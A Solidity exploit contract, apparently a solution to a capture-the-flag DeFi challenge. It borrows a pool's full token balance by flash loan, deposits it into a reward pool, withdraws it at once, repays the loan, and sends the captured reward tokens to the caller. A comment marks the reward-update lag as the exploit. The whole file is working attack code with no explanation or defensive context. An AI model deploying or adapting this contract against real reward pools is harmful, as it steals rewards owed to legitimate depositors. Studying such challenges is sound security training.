// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IFlashLoanerPool {
  function flashLoan(uint256 amount) external;
}

interface ITheRewarderPool {
  function deposit(uint256 amountToDeposit) external;
  function withdraw(uint256 amountToWithdraw) external;
}

interface IDVT {
  function transfer(address to, uint256 amount) external returns (bool);
  function approve(address spender, uint256 amount) external returns (bool);
  function balanceOf(address account) external view returns (uint256);
}

interface IRewardToken {
  function transfer(address to, uint256 amount) external returns (bool);
  function balanceOf(address account) external view returns (uint256);
}

contract RewardAttacker {
  IFlashLoanerPool public flashPool;
  ITheRewarderPool public rewardPool;
  IDVT public liquidityToken;
  IRewardToken public rewardToken;
  address public attacker;

  constructor(address _flashPool, address _rewardPool, address _dvt, address _rewardToken) {
    flashPool = IFlashLoanerPool(_flashPool);
    rewardPool = ITheRewarderPool(_rewardPool);
    rewardToken = IRewardToken(_rewardToken);
    liquidityToken = IDVT(_dvt);

    attacker = msg.sender;
  }

  function attack() external {
    // take out loan => call receiveFlashLoan
    // uint256 amount = address(flashPool).balance; <= this looks at ETH, not ERC20 tokens
    uint256 amount = liquidityToken.balanceOf(address(flashPool));
    flashPool.flashLoan(amount);

    // transfer token reward to attacker address
    uint256 reward = rewardToken.balanceOf(address(this));
    rewardToken.transfer(msg.sender, reward);
  }

  function receiveFlashLoan(uint256 amount) public payable {
    // approve loan funds transfer to rewardPool
    liquidityToken.approve(address(rewardPool), amount);

    // deposit loan funds in rewardPool
    rewardPool.deposit(amount);

    // withdraw funds: EXPLOIT: update lag allows funds to be withdrawn, while maintaining the reward payout
    rewardPool.withdraw(amount);

    // repay loan
    liquidityToken.transfer(address(flashPool), amount);
  }
}